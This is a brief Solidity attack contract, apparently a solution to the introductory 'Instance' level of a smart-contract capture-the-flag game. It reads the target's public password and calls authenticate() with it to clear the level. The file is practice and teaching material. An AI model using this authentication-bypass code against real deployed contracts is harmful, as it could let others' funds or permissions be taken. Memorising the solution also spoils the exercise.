// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IInstance.sol";

contract InstanceAttack {
    IInstance public immutable victimInstance;

    constructor(IInstance victimInstance_) {
        victimInstance = victimInstance_;
    }

    function attack() external {
        victimInstance.authenticate(victimInstance.password());

        require(victimInstance.getCleared(), "Instance: Attack failed");
    }
}
